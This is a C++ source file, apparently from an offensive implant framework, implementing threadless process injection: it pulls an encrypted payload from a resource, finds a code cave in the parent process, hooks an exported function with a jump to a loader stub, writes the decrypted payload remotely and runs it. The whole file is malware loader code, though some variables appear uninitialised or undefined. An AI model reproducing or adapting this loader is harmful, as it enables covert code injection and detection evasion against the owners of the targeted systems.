#include <loader/loaders.hpp>

namespace Injection {
    TXT_SECTION(G) BYTE Config[256] = {};

    VOID DLL_EXPORT Threadless(HMODULE Base) {
        HEXANE
        PARSER Parser   = { };
        LPVOID Payload  = { };
        HANDLE Proc     = { };
        ORSRC Rsrc      = { };

        DWORD Protect       = 0;
        UINT_PTR pExport    = 0;
        UINT_PTR xpCopy     = 0;
        UINT_PTR pHook      = 0;
        SIZE_T Read, Write  = 0;
        SIZE_T cbPayload    = 0;

        PBYTE Parent    = { };
        PBYTE Module    = { };
        PBYTE Export    = { };
        PBYTE Loader    = { };
        PBYTE Opcode    = { };

        Core::ResolveApi();
        Parser::CreateParser(&Parser, Config, sizeof(Config));

        if (
            !(pExport   = Memory::LdrGetExport(Module, Export)) ||
            !(Rsrc      = Memory::LdrGetIntResource(Base, IDR_RSRC_BIN1))) {
            return;
        }

        Payload = Ctx->Nt.RtlAllocateHeap(LocalHeap, 0, Rsrc->Size);
        MmPatchData(i, B_PTR(Payload), (i), B_PTR(Rsrc->ResLock), (i), Rsrc->Size);

        cbPayload = PAYLOAD_SIZE;
        Ctx->win32.FreeResource(Rsrc->hGlobal);

        if (
            !(Proc = Process::LdrGetParentHandle(Parent)) ||
            !(pHook = Memory::MmCaveHunter(Proc, pExport, cbPayload))) {
            return;
        }

        const auto LdrRva = pHook - (pExport + 5);
        const auto phCopy = pHook;

        MmPatchData(i, B_PTR(&xpCopy), (i), B_PTR(&pExport), (i), sizeof(LPVOID))
        MmPatchData(i, Loader, (0x12 + i), B_PTR(&xpCopy), (i), sizeof(LPVOID))
        MmPatchData(i, Opcode, (0x01 + i), B_PTR(&LdrRva), (i), 4)

        if (
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, C_PPTR(&xpCopy), &cbPayload, PAGE_EXECUTE_READWRITE, &Protect)) ||
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pExport), C_PTR(Opcode), sizeof(Opcode), &Write))
            || Write != sizeof(Opcode)) {
            return;
        }

        cbPayload = PAYLOAD_SIZE;

        if (
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, C_PPTR(&phCopy), &cbPayload, PAGE_READWRITE, &Protect)) ||
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook), Loader, sizeof(Loader), &Write)) || Write
            != sizeof(Loader)) {
            return;
        }

        Xtea::XteaCrypt(B_PTR(Payload), Rsrc->Size, Key, FALSE);

        if (
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook + sizeof(Loader)), Payload, Rsrc->Size, &Write)) || Write != Rsrc->Size ||
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, C_PPTR(&pHook), &cbPayload, Protect, &Protect))) {
            return;
        }

        if (Proc) {
            Ctx->Nt.NtClose(Proc);
        }
        if (Payload) {
            x_memset(Payload, 0, Rsrc->Size);
        }

        Execute();
    }
}
